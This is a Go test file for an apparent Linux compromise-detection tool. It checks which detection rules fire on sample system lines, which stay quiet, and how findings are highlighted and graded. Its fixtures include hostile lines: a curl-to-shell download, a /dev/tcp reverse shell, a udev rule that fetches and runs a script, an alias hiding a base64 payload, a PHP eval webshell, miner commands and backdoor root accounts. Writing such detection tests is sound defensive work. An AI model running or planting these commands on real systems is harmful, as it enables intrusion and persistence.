package linux

import (
	"slices"
	"strings"
	"testing"

	"karma/internal/model"
	"karma/internal/reader"
	"karma/internal/testkit"
)

// Rule hits for the catalog: each case feeds one line shaped like real target
// output and names the rule that must light. Cases with want as a negative rule
// lock the exclusions (the rules written around RE2's missing lookaround).
func TestLinuxCheckRules(t *testing.T) {
	cases := []struct {
		check string
		text  string
		want  string
	}{
		{"env", `LD_PRELOAD=/tmp/preload.so`, "ld-preload-var"},
		{"cron", `*/5 * * * * LD_PRELOAD=/tmp/.x.so /usr/sbin/backuptool`, "ld-preload-var"},
		{"shell-rc", `export LD_AUDIT=/tmp/audit.so`, "ld-preload-var"},
		{"env", `PATH=/usr/local/bin:/usr/bin:`, "env-path-dot"},
		{"env", `PYTHONPATH=/tmp/evil`, "env-python-path"},
		{"accounts", `backdoor:x:0:0::/:/bin/sh`, "acct-other-uid0"},
		{"accounts", `toor:x:0:1000::/:/bin/bash`, "acct-other-uid0"},
		{"accounts", `backdoor:x:0:0::/:/usr/sbin/nologin`, "acct-other-uid0"},
		{"accounts", `mysql:x:997:997::/var/lib/mysql:/bin/bash`, "acct-login-shell"},
		{"shadow", `root::18900:0:99999:7:::`, "shadow-empty-root"},
		{"shadow", `svc::18900:0:99999:7:::`, "shadow-empty"},
		{"groups", `sudo:x:27:alice`, "group-privileged"},
		{"groups", `backup:$6$salt$hash:18900:0:99999:7:::`, "group-password"},
		{"sudoers", `alice ALL=(ALL) NOPASSWD: ALL`, "sudo-nopasswd"},
		{"authorized-keys", `command="/tmp/s" ssh-ed25519 AAAA comment`, "authkeys-force-command"},
		{"sshd-config", `PermitRootLogin yes`, "sshd-permit-root-login"},
		{"sshd-config", `AuthorizedKeysFile .ssh/keys`, "sshd-authorized-keys-file"},
		{"sshd-config", `PasswordAuthentication yes`, "sshd-password-auth"},
		{"ssh-client-config", `ProxyCommand nc -x 10.0.0.8:1080 %h %p`, "ssh-client-proxy-command"},
		{"ps", `www-data  1234  0.0  0.1  1360  580 pts/0  Ss  /bin/sh`, "ps-service-shell"},
		{"ps", `root  1234  5.6  java -agentlib:jdwp=transport=dt_socket,server=y App`, "ps-jdwp"},
		{"ps", `www-data  2345  0.1  python3 -m http.server 8080`, "ps-http-server"},
		{"proc-caps", `context: container`, "cap-container-context"},
		{"proc-caps", `Current: cap_chown, cap_dac_override, cap_sys_admin`, "cap-sys-admin"},
		{"proc-caps", `CapEff: 000001ffffffffff  = cap_chown, cap_sys_admin`, "cap-sys-admin"},
		{"miner", `root  666  98.2  /tmp/xmrig -o stratum+tcp://pool.example.com:3333`, "miner-family"},
		{"miner", `root  667  1.2  ./run --pool stratum+tcp://pool.example.com:3333`, "miner-stratum"},
		{"miner", `-rw-r--r-- 1 root root 1234 Jun  1 10:00 /tmp/config.json`, "miner-config"},
		{"kallsyms", `ffffffffc0b08010 t diamorphine_init [diamorphine]`, "kallsyms-rootkit"},
		{"ps", `curl http://10.0.0.8/x.sh | sh`, "download-to-shell"},
		{"ps", `bash -i >& /dev/tcp/10.0.0.8/4444`, "shell-interactive"},
		{"listen", `ESTAB 0 0 10.0.0.5:22 5.6.7.8:4444 users:(("python",pid=1234))`, "net-interpreter-socket-ss"},
		{"deleted-exe", `/proc/1234/exe -> /tmp/.x (deleted)`, "deleted-binary"},
		{"deleted-exe", `sleep 2686147 root 0r REG 0,36 4 0 21655 /tmp/karma-del-test (deleted)`, "deleted-binary"},
		{"hidden-procs", `1234`, "proc-not-in-ps"},
		{"hidden-pids", `PID 42  fd=yes  comm=bash  cmd='/bin/bash -i'`, "hidden-pid"},
		{"cwd-tmp", `/proc/1234 -> /tmp/.x`, "proc-cwd-tmp"},
		{"firewall", `-A INPUT -p tcp --dport 22 -j ACCEPT`, "firewall-active"},
		{"tcp-wrappers", `sshd: ALL: spawn /tmp/x`, "wrappers-exec"},
		{"hosts-file", `10.0.0.8 evil.corp`, "hosts-nonlocal"},
		{"mounts", `//10.0.0.8/share /mnt/data cifs rw`, "mount-remote-fs"},
		{"services", `evil.service loaded auto-restart running`, "unit-crashloop"},
		{"cron", `@reboot /tmp/.x`, "cron-reboot"},
		{"cron", `*/1 * * * * /tmp/.x`, "cron-every-minute"},
		{"rc-local", `base64 -d ZwAh | sh`, "rc-b64-shell"},
		{"ld-preload", `/tmp/.preload.so`, "preload-entry"},
		{"shell-rc", `HISTFILE=/dev/null`, "history-off"},
		{"history", `history -c`, "history-clear"},
		{"tmp-listing", `-rw-r--r-- 1 root root 4096 Jun  1 10:00 /tmp/.backdoor`, "hidden-tmp-path"},
		{"key-dirs", `-rw------- 1 root root 1679 Jun  1 10:00 /root/.ssh/authorized_keys`, "ssh-material"},
		{"key-dirs", `drwxr-xr-x 1 root root 4096 Jun  1 10:00 /opt/chisel`, "tunnel-tool"},
		{"suid", `/home/deploy/find`, "suid-gtfobins"},
		{"suid", `/tmp/evil`, "suid-outside-system"},
		{"sgid", `/home/deploy/find`, "sgid-gtfobins"},
		{"sgid", `/var/lib/p`, "sgid-outside-system"},
		{"web-dirs", `/var/www/html/shell.php`, "web-script"},
		{"webshell-grep", `<?php @eval($_POST['c']); ?>`, "webshell-direct"},
		{"caps", `/usr/bin/x cap_setuid=ep`, "caps-setuid"},
		{"pkg-verify", `??5?????? c /etc/hosts`, "pkg-checksum"},
		// the verifier's own line for a regular package file: the attribute field
		// is blank, so the whole record is the finding. dpkg prints its nine flag
		// characters then three spaces, rpm four ("%s  %c %s", blank class).
		{"pkg-verify", `??5??????   /bin/ls`, "pkg-changed-file"},
		{"pkg-verify", `S.5....T.    /usr/bin/curl`, "pkg-changed-file"},
		{"pkg-verify", `/usr/sbin/sshd: ASCII text`, "bin-not-elf"},
		// the forensics sections list the files the verifier flagged: an ELF row
		// and an executable row are the replaced-binary case, in either channel's
		// row shape (the local tier's single spaces, GNU ls's padding)
		{"pkg-verify", `/bin/ls: ELF 64-bit LSB executable`, "pkg-changed-elf"},
		{"pkg-verify", `/usr/lib/x/libevil.so: ELF 64-bit LSB shared object`, "pkg-changed-elf"},
		{"pkg-verify", `-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`, "pkg-changed-exec"},
		{"pkg-verify", `-rwxr-xr-x  1 root root  8600 May 18 07:20 /bin/ls`, "pkg-changed-exec"},
		{"pkg-verify", `-rw-rwxr-- 1 root root 8600 May 18 07:20 /usr/lib/x/helper`, "pkg-changed-exec"},
		{"pkg-verify", `-rw-rw-rwx 1 root root 8600 May 18 07:20 /usr/lib/x/helper`, "pkg-changed-exec"},
		// the history records themselves are context (the check paints them by
		// shape); what signals there is the keyword rule over a command line
		{"pkg-history", `Commandline: curl -u deploy:secret https://example.invalid/x`, "secret-keyword"},
		{"modules-load", `evil_module`, "modules-boot-entry"},
		{"modules-hidden", `HIDDEN rootkit`, "module-hidden"},
		// the two evidence shapes a hidden module leaves: the sysfs one carries
		// what identifies it, the kallsyms one the symbol count
		{"modules-hidden", `HIDDEN rootkit size 16384 init 16384 refs 0 state live taint O text 0xffffffffc05a4000`, "module-hidden"},
		{"modules-hidden", `HIDDEN rootkit symbols 41`, "module-hidden"},
		// the taint marker at the end of a /proc/modules line: (POE) is
		// proprietary, out-of-tree and unsigned together, (E) unsigned alone
		{"lsmod", `nvidia 1234 5 - Live 0x0000000000000000 (POE)`, "module-out-of-tree"},
		{"lsmod", `vboxdrv 1234 5 - Live 0x0000000000000000 (E)`, "module-unsigned"},
		{"module-files", `-rw-r--r-- 1 root root 184320 Jun  1 10:00 rc_kernel.ko`, "module-files-out-of-tree"},
		{"tainted", `64`, "kernel-tainted"},
		{"module-sig-config", `CONFIG_MODULE_SIG=n`, "module-sig-off"},
		{"dmesg", `[    0.000000] module verification failed: taint flag set`, "dmesg-taint"},
		// a hooked kernel prints the table it found and the syscalls it replaced; the
		// keep filter carries the same vocabulary, so these lines reach the panel
		{"dmesg", `[  123.456789] real_sys_call_table: 00000000c05a4000`, "dmesg-syscall-hook"},
		{"dmesg", `[  123.456789] update __NR_openat: 0000000000000000->0000000000000000`, "dmesg-syscall-hook"},
		{"log-dirs", `-rw-r----- 1 www adm 0 Jun  1 10:00 access.log`, "logdir-middleware"},
		// a file the package database does not carry, and the two names that
		// mark it: a leading dash (BlackCat's /bin/-t) and a dot in a library
		// directory
		{"unowned-files", `/usr/lib/inject.so`, "unowned-file"},
		{"unowned-files", `/bin/-t`, "odd-dash-name"},
		{"key-dirs", `-rw-r--r-- 1 root root 0 Jun  1 10:00 /usr/lib/.inject.so`, "hidden-nonhome-path"},
		{"tmp-listing", `-rw-r--r-- 1 root root 0 Jun  1 10:00 /tmp/-rf`, "odd-dash-tmp"},
		// a shell alias that redefines a tool the analyst reads the host with,
		// and the payload inside its value the global rules grade
		{"shell-rc", `alias netstat='(echo YmFzaCAtYyAn|base64 -d|bash -i 2>/dev/null &);netstat'`,
			"alias-command-shadow"},
		{"shell-rc", `alias cat='-t'`, "alias-command-shadow"},
		// a hidden file directly in /home, and one in the root directory: the
		// two places the hidden-file rules only reach by naming them
		{"home-tree", `-rw-r--r-- 1 root root 13 Oct 06 02:45 /home/.hacker`, "hidden-nonhome-path"},
		{"key-dirs", `-rwsr-xr-x 1 root root 1100000 Oct 06 02:45 /.root`, "hidden-root-path"},
		{"suid", `/.root`, "hidden-root-path"},
		// a command line that ends in a hidden root path names one, while a
		// request line carrying it mid-row is a URL
		{"history", `cat /.env`, "hidden-root-path"},
	}

	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.check)
		if !slices.Contains(testkit.HitIDs(t, tc.text, check), tc.want) {
			t.Errorf("%s should light %s: %q", tc.check, tc.want, tc.text)
		}
	}
}

// The exclusions carry the other half of the precision: these lines must stay quiet.
func TestLinuxRuleExclusions(t *testing.T) {
	cases := []struct {
		check string
		text  string
		quiet string
	}{
		{"accounts", `root:x:0:0:root:/root:/bin/bash`, "acct-other-uid0"},
		{"shadow", `root:!:18900:0:99999:7:::`, "shadow-empty-root"},
		{"sshd-config", `PermitRootLogin no`, "sshd-permit-root-login"},
		{"hosts-file", `127.0.0.1 localhost`, "hosts-nonlocal"},
		{"env", `PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`, "env-path-dot"},
		{"pkg-verify", `..5?????? c /etc/hosts`, "bin-not-elf"},
		// a changed conffile is the administrator's edit, so the whole-record rule
		// leaves those rows to the quiet three-character checksum rule, and a file
		// the package no longer ships is not a checksum mismatch at all
		{"pkg-verify", `??5?????? c /etc/hosts`, "pkg-changed-file"},
		{"pkg-verify", `S.5....T. c /etc/ssh/sshd_config`, "pkg-changed-file"},
		{"pkg-verify", `missing     /usr/bin/foo`, "pkg-changed-file"},
		{"suid", `/usr/bin/sudo`, "suid-outside-system"},
		{"suid", `/usr/lib/openssh/ssh-keysign`, "suid-outside-system"},
		{"suid", `/usr/lib64/x`, "suid-outside-system"},
		{"suid", `/usr/libexec/y`, "suid-outside-system"},
		{"suid", `/usr/local/bin/z`, "suid-outside-system"},
		{"sgid", `/usr/lib/x86_64-linux-gnu/utempter/utempter`, "sgid-outside-system"},
		// the temp listing's hidden-entry rule is the global one, so its standard
		// system entries stay quiet here too
		{"tmp-listing", `drwxrwxrwt 2 root root 4096 Jun  1 10:00 /tmp/.X11-unix`, "hidden-tmp-path"},
		{"tmp-listing", `-rw-r--r-- 1 root root 4096 Jun  1 10:00 /tmp/.pwd.lock`, "hidden-tmp-path"},
		// a changed conffile is the administrator's edit: the binary rules leave
		// its rows and the text-type rows alone
		{"pkg-verify", `-rw-r--r-- 1 root root 358 May 16 15:05 /etc/default/syslog-ng`, "pkg-changed-exec"},
		{"pkg-verify", `-rw-r--r-- 1 root root 358 May 16 15:05 /etc/default/syslog-ng`, "pkg-changed-elf"},
		{"pkg-verify", `/etc/logrotate.conf: ASCII text`, "pkg-changed-elf"},
		// a directory row carries execute bits but is not a program
		{"pkg-verify", `drwxr-xr-x 2 root root 4096 May 16 15:05 /usr/share/x`, "pkg-changed-exec"},
		// the hook rule is for the table, not for every line about modules, and
		// the kernel's own write-protect line is why `protect` is not in the
		// widened allowlist
		{"dmesg", `[    0.000000] module verification failed: taint flag set`, "dmesg-syscall-hook"},
		{"dmesg", `[    0.673491] Write protecting the kernel read-only data: 14336k`, "dmesg-syscall-hook"},
		// a module the list does carry is not a hidden module, an unmarked
		// /proc/modules row carries no taint letters, and the lsmod tier's own
		// layout has no marker column at all
		{"modules-hidden", `nf_tables 409600 0 - Live 0xffffffffc0567000`, "module-hidden"},
		{"lsmod", `nf_tables 409600 0 - Live 0xffffffffc0567000`, "module-out-of-tree"},
		{"lsmod", `nf_tables 409600 0 - Live 0xffffffffc0567000`, "module-unsigned"},
		{"lsmod", `nvidia             1234  5`, "module-out-of-tree"},
		// the stock colour aliases are the same shape as a shadowing one, and
		// systemd's root mount unit is the one dash-led name a listing carries
		{"shell-rc", `alias ls='ls --color=auto'`, "alias-command-shadow"},
		{"shell-rc", `alias ll='ls -alF'`, "alias-command-shadow"},
		{"systemd-generators", `-rw-r--r-- 1 root root 0 Jun  1 10:00 /run/systemd/generator/-.mount`,
			"odd-dash-name"},
		{"key-dirs", `drwxr-xr-x 3 root root 0 Jun  1 10:00 /usr/lib/.build-id`, "hidden-nonhome-path"},
		// a dotfile in a user's own home is the normal case, and the container
		// marker, the SELinux flag and the OpenSSL seed are the stock root ones
		{"home-tree", `-rw-r--r-- 1 root root 13 Oct 06 02:45 /home/alice/.bashrc`, "hidden-nonhome-path"},
		{"key-dirs", `-rw-r--r-- 1 root root 0 Jun  1 10:00 /.dockerenv`, "hidden-root-path"},
		{"key-dirs", `-rw-r--r-- 1 root root 0 Jun  1 10:00 /.autorelabel`, "hidden-root-path"},
		{"key-dirs", `-rw------- 1 root root 0 Jun  1 10:00 /.rnd`, "hidden-root-path"},
		{"home-tree", `-rw-r--r-- 1 root root 13 Oct 06 02:45 /home/.snapshots`, "hidden-nonhome-path"},
		// a URL in a request line is a path somewhere else
		{"access-log", `10.0.0.9 - - [18/Apr/2024:02:36:00 +0800] "GET /../../etc/passwd HTTP/1.1" 404 0`,
			"hidden-root-path"},
	}
	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.check)
		if slices.Contains(testkit.HitIDs(t, tc.text, check), tc.quiet) {
			t.Errorf("%s must stay quiet on: %q (%s)", tc.check, tc.text, tc.quiet)
		}
	}
}

// The special-bit rules divide the listing: a setuid/setgid binary under the
// system program directories is a stock install, and one anywhere else — the
// backdoor's classic placement — lights the outside-system rule.
func TestSpecialBitsOutsideSystemDirs(t *testing.T) {
	suid, sgid := testkit.CheckByID(t, All, "suid"), testkit.CheckByID(t, All, "sgid")
	flagged := map[*model.Check][]struct{ path, rule string }{
		suid: {
			{"/tmp/evil", "suid-outside-system"},
			{"/home/deploy/find", "suid-outside-system"},
			{"/opt/vendor/helper", "suid-outside-system"},
			{"/var/lib/p", "suid-outside-system"},
		},
		sgid: {
			{"/usr/local/share/x", "sgid-outside-system"},
			{"/srv/backup/tool", "sgid-outside-system"},
		},
	}
	for check, entries := range flagged {
		for _, entry := range entries {
			if !slices.Contains(testkit.HitIDs(t, entry.path, check), entry.rule) {
				t.Errorf("%s should light %s on %s", check.ID, entry.rule, entry.path)
			}
		}
	}
}

// A rule's span is what the panel paints, so it must cover the whole token the
// reason names; a pattern that stopped after the first character painted half of
// a path or a hostname.
func TestLinuxRuleSpansCoverTheToken(t *testing.T) {
	cases := []struct {
		check string
		text  string
		rule  string
		want  string
	}{
		{"cron", `10 * * * * root /etc/.help.sh`, "hidden-nonhome-path", "/etc/.help.sh"},
		{"cron", `*/5 * * * * /tmp/.x`, "hidden-tmp-path", "/tmp/.x"},
		{"hosts-file", `172.17.0.6 cace4a393ea9`, "hosts-nonlocal", "172.17.0.6 cace4a393ea9"},
		{"hosts-file", `172.17.0.6 evil.corp  # note`, "hosts-nonlocal", "172.17.0.6 evil.corp"},
		{"caps", `/usr/bin/x cap_setuid=ep`, "caps-setuid", "cap_setuid=ep"},
		{"caps", `/usr/bin/x cap_net_raw=ep`, "caps-present", "cap_net_raw=ep"},
		{"cwd-tmp", `/proc/1234 -> /tmp/evil/x.sh`, "proc-cwd-tmp", "/proc/1234 -> /tmp/evil/x.sh"},
		{"udev-rules", `RUN+="/bin/sh -c 'curl http://10.0.0.8/x|sh'"`, "udev-exec-key",
			`RUN+="/bin/sh -c 'curl http://10.0.0.8/x|sh'"`},
		// a changed binary is the whole record, not one field of it
		{"pkg-verify", `-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`, "pkg-changed-exec",
			`-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`},
		{"pkg-verify", `/bin/ls: ELF 64-bit LSB executable`, "pkg-changed-elf",
			`/bin/ls: ELF 64-bit LSB executable`},
		// the verifier's line for a regular package file is the whole record,
		// the flags and the name together
		{"pkg-verify", `??5??????   /bin/ls`, "pkg-changed-file", `??5??????   /bin/ls`},
		// the hook rule paints the identifier that names the table, prefix and all
		{"dmesg", `[  123.456789] real_sys_call_table: 00000000c05a4000`, "dmesg-syscall-hook",
			`real_sys_call_table`},
		{"dmesg", `[  123.456789] update __NR_openat: 0000000000000000->0000000000000000`, "dmesg-syscall-hook",
			`__NR_openat`},
		// the hidden-module rule paints the marker and the module's name; the
		// taint rules paint the marker the module list appends
		{"modules-hidden", `HIDDEN rootkit size 16384 taint O`, "module-hidden", `HIDDEN rootkit`},
		{"lsmod", `nvidia 1234 5 - Live 0x0000000000000000 (POE)`, "module-out-of-tree", `(POE)`},
		{"lsmod", `vboxdrv 1234 5 - Live 0x0000000000000000 (E)`, "module-unsigned", `(E)`},
		// the unowned-file rule paints the row whole, the find rows being bare
		// paths
		{"unowned-files", `/usr/lib/inject.so`, "unowned-file", `/usr/lib/inject.so`},
		{"unowned-files", `/bin/-t`, "unowned-file", `/bin/-t`},
		// a bare-path row carries the root-level name alone
		{"suid", `/.root`, "hidden-root-path", `/.root`},
		{"home-tree", `-rw-r--r-- 1 root root 13 Oct 06 02:45 /home/.hacker`, "hidden-nonhome-path",
			`/home/.hacker`},
	}
	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.check)
		document := reader.Analyze(tc.text, check.Rules, check.Filters, check.Normalize, 0, model.FloorAll)
		spans := 0
		for _, section := range document.Sections {
			for _, line := range section.Lines {
				for _, match := range line.Matches {
					if match.ID != tc.rule {
						continue
					}
					spans++
					if got := line.Text[match.Start:match.End]; got != tc.want {
						t.Errorf("%s %s paints %q, want %q", tc.check, tc.rule, got, tc.want)
					}
				}
			}
		}
		if spans == 0 {
			t.Errorf("%s should light %s: %q", tc.check, tc.rule, tc.text)
		}
	}
}

func TestPreloadSurfacesAreCritical(t *testing.T) {
	cases := []struct{ check, text string }{
		{"ld-preload", `/tmp/.preload.so`},
		{"env", `LD_PRELOAD=/tmp/preload.so`},
		{"cron", `*/5 * * * * LD_PRELOAD=/tmp/.x.so /usr/sbin/backuptool`},
		{"shell-rc", `export LD_AUDIT=/tmp/audit.so`},
	}
	for _, tc := range cases {
		check := testkit.CheckByID(t, All, tc.check)
		document := reader.Analyze(tc.text, check.Rules, check.Filters, check.Normalize, 0, model.FloorAll)
		line := document.Sections[0].Lines[0]
		if line.Severity != model.Critical {
			t.Errorf("%s: %q should be critical, got %v", tc.check, tc.text, line.Severity)
		}
	}
}

func TestPkgVerifyGradesTheVerifierRows(t *testing.T) {
	check := testkit.CheckByID(t, All, "pkg-verify")
	cases := []struct {
		text     string
		severity model.Severity
		rule     string
		span     string
	}{
		{`??5??????   /bin/ls`, model.Medium, "pkg-changed-file", `??5??????   /bin/ls`},
		{`??5?????? c /etc/hosts`, model.High, "pkg-checksum", `??5`},
		{`/bin/ls: ELF 64-bit LSB executable`, model.Critical, "pkg-changed-elf",
			`/bin/ls: ELF 64-bit LSB executable`},
		{`-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`, model.Critical, "pkg-changed-exec",
			`-rwxr-xr-x 1 root root 8600 May 18 07:20 /bin/ls`},
	}
	for _, tc := range cases {
		document := reader.Analyze(tc.text, check.Rules, check.Filters, check.Normalize, 0, model.FloorAll)
		line := document.Sections[0].Lines[0]
		if line.Severity != tc.severity {
			t.Errorf("%q should be graded %v, got %v", tc.text, tc.severity, line.Severity)
		}
		if len(line.Matches) != 1 || line.Matches[0].ID != tc.rule {
			t.Errorf("%q should be graded by %s alone, got %+v", tc.text, tc.rule, line.Matches)
			continue
		}
		if got := line.Text[line.Matches[0].Start:line.Matches[0].End]; got != tc.span {
			t.Errorf("%s paints %q, want %q", tc.rule, got, tc.span)
		}
	}
}

// The dmesg allowlist is a precision filter, not a net: the loader's own records
// and the words a hooked kernel prints come through, ordinary kernel messages do
// not, and a line that names the syscall table is a High finding rather than a
// quiet row. An LKM's prints that carry none of the vocabulary ("Changing
// 0x…->0x…") are still dropped — the allowlist is deliberately narrow.
func TestDmesgKeepFilterPrecision(t *testing.T) {
	check := testkit.CheckByID(t, All, "dmesg")
	text := "[    0.000000] Linux version 6.8.0-45-generic (buildd@lcy02)\n" +
		"[    0.673491] Write protecting the kernel read-only data: 14336k\n" +
		"[    1.234567] rootkit: loading out-of-tree module taints kernel.\n" +
		"[  123.456789] real_sys_call_table: 00000000c05a4000\n" +
		"[  123.456789] Changing 0000000000000000->0000000000000000.\n"
	document := reader.Analyze(text, check.Rules, check.Filters, check.Normalize, 0, model.FloorAll)

	var kept []string
	for _, section := range document.Sections {
		for _, line := range section.Lines {
			kept = append(kept, line.Text)
			if strings.Contains(line.Text, "sys_call_table") && line.Severity != model.High {
				t.Errorf("the syscall-table line should be High, got %v", line.Severity)
			}
		}
	}
	want := []string{
		"[    1.234567] rootkit: loading out-of-tree module taints kernel.",
		"[  123.456789] real_sys_call_table: 00000000c05a4000",
	}
	if !slices.Equal(kept, want) {
		t.Errorf("the allowlist kept %q, want %q", kept, want)
	}
}
